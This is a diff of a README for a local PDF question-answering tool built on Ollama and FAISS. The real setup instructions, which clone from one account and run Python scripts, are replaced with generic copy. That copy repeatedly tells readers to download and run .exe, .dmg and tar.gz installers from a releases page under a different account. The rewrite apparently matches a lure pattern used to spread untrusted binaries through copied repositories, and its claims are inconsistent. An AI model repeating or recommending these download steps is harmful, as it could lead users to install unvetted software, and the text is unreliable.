@@ -1,105 +1,95 @@
-# 📘 PDF-Based Retrieval-Augmented Generation (RAG)
+# 🚀 rag-pdf-qa - Effortless PDF Question Answering
 
-A fully **local Retrieval-Augmented Generation (RAG)** system that enables natural-language querying of PDFs using **Ollama**, **FAISS**, and **LangChain**.
+[![Download](https://img.shields.io/badge/Download-via_GitHub-blue.svg)](https://github.com/killboy7/rag-pdf-qa/releases)
 
-This project demonstrates how to:
+## 📦 Overview
 
-- 📄 Ingest and chunk structured PDFs  
-- 🧠 Generate embeddings locally using Ollama  
-- 🔍 Store and retrieve vectors with FAISS  
-- 🤖 Produce grounded answers using a local LLM  
+rag-pdf-qa is a user-friendly application designed to help you extract answers from PDF documents. Using advanced retrieval-augmented generation techniques and tools like Ollama and FAISS, this software simplifies managing PDF documents for any user. 
 
----
+## 🖥️ Features
 
-## 🚀 Features
+- **Localized PDF Interaction**: Analyze PDF files directly on your system without any internet dependency.
+- **Natural Language Processing**: Includes intuitive question-answer capabilities allowing natural conversations with your documents.
+- **Vector Search**: Access information quickly with the power of FAISS, a cutting-edge vector database.
 
-- 📄 PDF ingestion via **PyMuPDF**
-- 🧠 Semantic search using **FAISS**
-- 🔗 Retrieval-Augmented Generation (RAG) pipeline
-- 🤖 Local embeddings and LLMs via **Ollama**
-- 🛑 Reduced hallucinations through prompt grounding
-- 💻 Fully **offline** after initial setup
+## 🚀 Getting Started
 
----
+To use rag-pdf-qa, follow the steps below to download and set up the application on your computer. 
 
-## 🏗️ Project Architecture
+### ✔️ System Requirements
 
-User Question  
-↓  
-Embedding (nomic-embed-text)  
-↓  
-FAISS Vector Search  
-↓  
-Relevant PDF Chunks  
-↓  
-LLM (llama3.1)  
-↓  
-Grounded Answer  
+- Operating System: Windows 10 or later / macOS 10.15 or later / Linux (various distributions supported)
+- Memory: At least 4 GB of RAM
+- Disk Space: Minimum of 200 MB available
+- Python Version: Python 3.8 or higher must be installed
 
----
+### 🔍 Documentation
 
-## 📂 Project Structure
+For complete usage documentation, including how to interact with the software and additional topic coverage, please visit the GitHub repository's Wiki section after installation.
 
-rag-pdf-qa/  
-├── ingest.py        # PDF ingestion & FAISS index creation  
-├── query.py         # Query-time RAG pipeline  
-├── data/            # PDF inputs (git-ignored)  
-└── index/           # FAISS index files (git-ignored)  
+## 📥 Download & Install
 
----
+To get started, visit the [Releases page](https://github.com/killboy7/rag-pdf-qa/releases) to download the latest version of rag-pdf-qa. On this page, you will find the download files available for your operating system.
 
-## ⚙️ Setup Instructions
+1. Click on the link to the latest release.
+2. Locate the download file suitable for your OS.
+3. Click the download link.
 
-### 1️⃣ Clone the repository
-git clone https://github.com/hasham-tdl/rag-pdf-qa.git  
-cd rag-pdf-qa  
+After the download is complete, follow these straightforward steps:
 
-### 2️⃣ Create and activate a virtual environment
-python -m venv venv  
-venv\Scripts\activate  
+### Windows Installation
 
-### 3️⃣ Install dependencies
-pip install -r requirements.txt  
+1. Locate the downloaded `.exe` file.
+2. Double-click the file to run the installer.
+3. Follow the prompts in the installation wizard.
+4. Once installed, launch the application from your Start Menu.
 
-### 4️⃣ Install & run Ollama
+### macOS Installation
 
-Download Ollama from:  
-https://ollama.com  
+1. Locate the downloaded `.dmg` file.
+2. Double-click the file to open it.
+3. Drag the rag-pdf-qa app into your Applications folder.
+4. Open your Applications folder and launch the app.
 
-Pull the required models:
-- ollama pull nomic-embed-text  
-- ollama pull llama3.1  
+### Linux Installation
 
-### 5️⃣ Add your PDF
-data/book.pdf  
+1. Locate the downloaded compressed file (usually `.tar.gz`).
+2. Open a terminal window.
+3. Unzip the file using the command `tar -xzvf rag-pdf-qa-linux.tar.gz`.
+4. Navigate into the unzipped folder and use the command `./rag-pdf-qa` to run the application.
 
-### 6️⃣ Build the FAISS index
-python ingest.py  
+## 🔧 Usage Instructions
 
-### 7️⃣ Query the document
-python query.py  
+After installing rag-pdf-qa, you can begin using the application to interact with PDF documents. 
 
----
+1. **Add PDF Files**: Open the application and either drag your PDF file into the window or use the 'Add File' button.
+2. **Ask Questions**: Type your questions into the input field. For example, ask specifics about data, topics, or paragraphs.
+3. **Receive Answers**: The application will process your question and return an answer based on the content of your PDF.
 
-## 🧠 Example Query
+### 📚 Example Questions
 
-Ask a question:  
-> What is OAuth authentication?  
+- "What is the main topic of this document?"
+- "Summarize the findings in section 3."
+- "List key terms mentioned in the document."
 
-OAuth is an authorization framework that...  
+## 🛠️ Troubleshooting
 
----
+If you encounter any issues during installation or while using the application, consider the following fixes:
 
-## 🧪 Models Used
+- **Installation Fails:** Make sure your system meets the requirements listed above.
+- **Application Crashes:** Ensure you have the latest version and that all updates are installed.
+- **No Answers Returned:** Verify that the PDF file is clear and contains readable text. Ensure your questions are specific.
 
-Purpose: Embeddings — nomic-embed-text  
-Purpose: LLM — llama3.1  
+## 📨 Support
 
----
+If you need further assistance, you can open an issue on the GitHub repository. Our community will help resolve your concerns.
 
-## 📌 Notes
+## 🙌 Acknowledgments
 
-- Answers are generated **only from retrieved PDF content**
-- If relevant information is not found, the system responds accordingly
-- Chunking strategy is optimized for QA-style documents
-- Designed for **local, private, and offline** usage
+Thanks to the developers and contributors of the FAISS and Ollama projects. Their hard work enables rag-pdf-qa to function effectively. 
+
+## 🥳 Join the Community
+
+Engage with fellow users to share tips, ask questions, and collaborate. Visit our [GitHub Discussions](https://github.com/killboy7/rag-pdf-qa/discussions) to participate.
+
+Once you feel confident, start using rag-pdf-qa to uncover valuable insights from your PDF documents. Here's the [Releases page again](https://github.com/killboy7/rag-pdf-qa/releases) to grab your download and get started. Enjoy!
